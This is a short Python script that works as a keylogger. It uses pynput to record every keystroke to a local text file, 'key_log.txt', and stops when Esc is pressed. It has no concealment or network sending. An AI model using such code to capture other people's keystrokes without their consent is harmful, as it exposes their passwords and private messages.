from pynput import keyboard

logFile = "key_log.txt"

def on_press(Key):
    try:
        with open(logFile, "a") as f:
            f.write(f"{Key.char}")
    except AttributeError:
        with open(logFile, "a") as f:
            f.write(f"[{Key.name}]")

def on_release(Key):
    if Key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()